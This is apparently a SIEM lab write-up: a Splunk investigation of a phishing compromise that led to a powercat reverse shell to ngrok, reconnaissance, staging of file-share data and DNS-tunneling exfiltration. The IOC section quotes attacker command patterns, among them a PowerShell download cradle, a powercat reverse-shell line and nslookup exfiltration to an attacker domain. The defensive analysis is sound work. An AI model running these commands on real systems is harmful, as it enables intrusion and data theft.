# SIEM-Splunk: Live-Phishing-Attack &nbsp;&nbsp; <img width="100" height="98" alt="629b450a95f79dc9fa7256f1" src="https://github.com/user-attachments/assets/ecb9b323-1aec-4023-9835-7e21bf87384f" />

Used Splunk SIEM to monitor and investigate a live phishing attack in real time across a corporate network. Identified key indicators of compromise, including suspicious DNS activity, PowerShell execution, and reverse shell connections, and compiled these findings into detailed reports to map the full scope of the breach.

**Incident Report**

On April 19, 2026, host win-3450 was compromised through a phishing-based initial access, leading to full attacker control via a PowerShell reverse shell. The attacker conducted reconnaissance, accessed sensitive network resources, staged data locally, and exfiltrated data using DNS tunneling. Evidence from SIEM alerts and Splunk logs confirms a complete attack chain involving command execution, lateral access, data collection, and exfiltration. This incident represents a confirmed compromise with data exfiltration, including sensitive financial documents and cryptocurrency-related credentials.

<img width="1892" height="788" alt="dashboard 1" src="https://github.com/user-attachments/assets/5901e671-c362-4f22-bd7e-95f69b47c7de" />

*Figure 1: Dashboard Alerts*

<img width="1524" height="770" alt="dashboard 3" src="https://github.com/user-attachments/assets/fc534ec3-d57f-4465-96dd-72504255eff4" />

*Figure 2: True Positive Alerts*

**Attack Timeline & Findings**

On 04/19/2026 16:43:04.563, the first true positive alert came in (Figure 3). A suspicious email attachment (Important: Pending Invoice!.eml) was opened via Outlook. This was found to be a malicious file (Figure 4). Shortly after, PowerShell was executed and used to download and run a remote script: **powercat.ps1** from GitHub. A reverse shell was established to: **2.tcp.ngrok.io:19282** (Figure 5).

<img width="1529" height="524" alt="1005" src="https://github.com/user-attachments/assets/e4da3d41-e827-426a-959b-17075a5860dd" />

*Figure 3: Suspicious Attachment found in email*

<img width="871" height="744" alt="1005b" src="https://github.com/user-attachments/assets/be49526a-90c7-4606-9cd8-b2d55a2f006d" />

*Figure 4: Malicious attachment - invioce.pdf.lnk*

<img width="1618" height="426" alt="image" src="https://github.com/user-attachments/assets/f8c809a1-cd71-49e0-843a-b02056c5a5ad" />

*Figure 5: powercat.ps1 from GitHub*

**Establishing Foothold & Reconnaissance**

Once access was established, the attacker executed discovery commands:
- whoami
- whoami /priv
- systeminfo
- net user
- net localgroup

This confirms interactive control of the system (Figure 6).

<img width="1913" height="699" alt="1" src="https://github.com/user-attachments/assets/7b404519-256e-4c38-9732-2c37d436fc46" />

*Figure 6: Multiple reconnaissance commands executed via PowerShell*

**Access to Network Share (Lateral Movement / Collection)**

The attacker mapped a network drive: **Z: \\FILESRV-01\SSF-FinancialRecords** (Figure 7). This indicates access to sensitive financial data on a file server.

<img width="1914" height="793" alt="1" src="https://github.com/user-attachments/assets/b239c6f7-277d-4745-bf55-331561c12e15" />

*Figure 7: SSF-FinancialRecords*

**Data Staging and Collection**

The attacker copied files from the network share to a local staging directory: **C:\Users\michael.ascot\downloads\exfiltration\** using **Robocopy.exe** (spawned by PowerShell).

<img width="1914" height="793" alt="1" src="https://github.com/user-attachments/assets/24b259ad-7a7c-403e-8266-4cbae149179c" />

*Figure 8: Robocopy.exe*

**Cleanup of Network Access**

After staging the data, the attacker removed the mapped drive: **net use Z: /delete** This indicates intent to reduce forensic artifacts.

<img width="1914" height="793" alt="1" src="https://github.com/user-attachments/assets/cdbbc4ca-e9a0-4901-93b1-55145c6bc55e" />

*Figure 9: Attacker reducing forensic artifacts*

**Data Exfiltration via DNS Tunneling**

The attacker exfiltrated data using DNS queries:

Technique - Files were:
- Read from disk
- Encoded in Base64
- Split into chunks
- Sent via nslookup to: **\*.haz4rdw4re.io** (Figure 12)

<img width="1628" height="571" alt="1" src="https://github.com/user-attachments/assets/53a96839-6784-45be-a1a7-e2808bfba8a7" />

*Figure 10: Exfiltration of cryptocurrency credentials*

<img width="1634" height="481" alt="1" src="https://github.com/user-attachments/assets/a0eded5b-d950-407a-84c3-174755e8ddad" />

*Figure 11: Attacker exfiltrating file - **exfil8me.zip***

<img width="966" height="638" alt="1" src="https://github.com/user-attachments/assets/dda02314-1be3-4248-9b65-d78c688d1a94" />

*Figure 12: Evidence of DNS Tunneling*


**Indicators of Compromise (IOCs)**

Domains:
- 2.tcp.ngrok.io
- haz4rdw4re.io
  
File Names:
- PowerView.ps1
- powercat.ps1
- exfil8me.zip
- BitcoinWalletPasscodes.txt
  
Commands / Techniques:
- IEX(New-Object System.Net.WebClient).DownloadString(...)
- powercat -c <domain> -p <port> -e powershell
- net use Z: \FILESRV-01\SSF-FinancialRecords
- Robocopy.exe ... /E
- nslookup <encoded_data>.haz4rdw4re.io
- powershell.exe -ExecutionPolicy Bypass

**MITRE ATT&CK Mapping**

- T1059.001 – PowerShell execution
- T1105 – Ingress Tool Transfer (powercat download)
- T1071.004 – DNS for Command & Control / Exfiltration
- T1041 – Exfiltration Over C2 Channel
- T1027 – Obfuscated/Encoded Commands (Base64)
- T1082 – System Information Discovery
- T1039 – Data from Network Share
- T1560 – Archive Collected Data
- T1219 / T1572 – Remote Access / Tunneling (ngrok)

**Impact Assessment**

- Confirmed data exfiltration
Access to:
  1. Financial records
  2. Investor data
  3. Cryptocurrency wallet credentials
- Full remote command execution achieved
- Compromise of user account: michael.ascot

**Conclusion**

This incident demonstrates a complete end-to-end attack lifecycle, including:

- Initial access (phishing)
- Command execution (PowerShell)
- Remote command execution via reverse shell
- Internal reconnaissance
- Data collection from network shares
- Data staging and cleanup
- Covert data exfiltration via DNS

The activity is malicious and confirmed, not a false positive.

**Recommended Actions**
- Immediately isolate host win-3450 which belongs to Michael Ascot
- Block domains:
  1. ngrok.io
  2. haz4rdw4re.io
- Reset credentials for affected user(s)
- Review access to file server FILESRV-01
- Perform full forensic analysis or reimage host
Enable:
  1. PowerShell logging (Script Block + Module)
  2. DNS monitoring and filtering
- Hunt for similar activity across environment
- Increase cybersecurity awareness for employees





